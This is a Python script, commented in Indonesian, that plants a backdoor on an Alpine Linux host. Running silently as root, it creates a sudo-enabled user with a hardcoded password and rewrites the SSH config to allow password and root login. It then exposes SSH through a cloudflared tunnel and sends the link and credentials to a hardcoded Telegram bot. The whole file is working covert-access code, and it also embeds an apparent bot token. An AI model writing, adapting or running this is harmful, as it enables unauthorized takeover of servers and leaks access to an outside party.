import subprocess
import time
import re
import os
import shutil
import sys

# --- KONFIGURASI ---
TOKEN = "7520250109:AAGRiIauax-4mDUBp2CWjUqYgyrG2sncpjk"
CHAT_ID = "2029488529"
USER_SSH = "system-thc"
PASS_SSH = "cokaberul123"
SSH_PORT = "2222"
LOG_FILE = "/tmp/cloudflared.log"

def run_cmd(cmd):
    """Menjalankan perintah shell di Alpine secara diam-diam."""
    try:
        subprocess.run(cmd, shell=True, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return True
    except:
        return False

def setup_alpine_ssh():
    print("[-] Konfigurasi Alpine SSH...")
    
    # 1. Update & Install paket minimalis Alpine
    # openssh-server-pam seringkali tidak ada di Alpine, kita gunakan openssh biasa
    run_cmd("apk update")
    run_cmd("apk add openssh sudo wget coreutils shadow")

    # 2. Buat User (Gunakan shadow untuk chpasswd)
    run_cmd(f"userdel -r {USER_SSH}")
    run_cmd(f"adduser -D -s /bin/sh {USER_SSH}")
    run_cmd(f"echo '{USER_SSH}:{PASS_SSH}' | chpasswd")
    
    # 3. Privilege Sudo
    run_cmd(f"addgroup {USER_SSH} wheel")
    with open("/etc/sudoers.d/90-system-thc", "w") as f:
        f.write(f"{USER_SSH} ALL=(ALL) ALL")

    # 4. SSHD Config Minimalis
    ssh_config = f"""
Port {SSH_PORT}
PasswordAuthentication yes
PermitRootLogin yes
Subsystem sftp /usr/lib/ssh/sftp-server
"""
    with open("/etc/ssh/sshd_config", "w") as f:
        f.write(ssh_config)
    
    # 5. Jalankan SSH di Alpine (OpenRC atau Manual)
    run_cmd("/usr/bin/ssh-keygen -A") # Generate host keys jika belum ada
    run_cmd("/usr/sbin/sshd") # Jalankan daemon sshd langsung

def check_cloudflared():
    print("[-] Mengecek Cloudflared (Musl version)...")
    if not shutil.which("cloudflared"):
        # PENTING: Untuk Alpine harus download versi -linux-amd64 (statis) atau versi musl
        dl_url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64"
        run_cmd(f"wget {dl_url} -O /usr/local/bin/cloudflared")
        run_cmd("chmod +x /usr/local/bin/cloudflared")

def start_tunnel():
    print(f"[-] Menghidupkan Tunnel di Port {SSH_PORT}...")
    run_cmd("pkill -9 cloudflared")
    
    if os.path.exists(LOG_FILE):
        try: os.remove(LOG_FILE)
        except: pass

    # Tetap gunakan nice -n 19 agar Alpine tetap ringan dan web tidak hang
    cmd = f"nice -n 19 cloudflared tunnel --url tcp://localhost:{SSH_PORT} > {LOG_FILE} 2>&1 &"
    subprocess.Popen(cmd, shell=True)

    time.sleep(15)

    full_url = None
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, "r") as f:
            log_content = f.read()
            match = re.search(r'https://[-a-zA-Z0-9.]*\.trycloudflare.com', log_content)
            if match:
                full_url = match.group(0)

    if full_url:
        send_telegram(full_url)
    else:
        print("[!] Gagal mendapatkan link.")

def send_telegram(url):
    import urllib.request
    import urllib.parse
    clean_url = url.replace("https://", "")
    message = (
        "🏔️ *ALPIINE ACCESS READY* 🏔️\n\n"
        f"👤 *User:* `{USER_SSH}`\n"
        f"🔑 *Pass:* `{PASS_SSH}`\n"
        f"🌐 *Link:* `{url}`\n\n"
        "*Command SSH:* \n"
        f"```ssh -o ProxyCommand=\"cloudflared access tcp --hostname %h\" {USER_SSH}@{clean_url}```"
    )
    encoded_msg = urllib.parse.quote(message)
    api_url = f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={CHAT_ID}&text={encoded_msg}&parse_mode=Markdown"
    try:
        urllib.request.urlopen(api_url, timeout=10)
    except:
        pass

if __name__ == "__main__":
    if os.getuid() != 0:
        sys.exit(1)

    setup_alpine_ssh()
    check_cloudflared()
    start_tunnel()
    sys.exit(0)
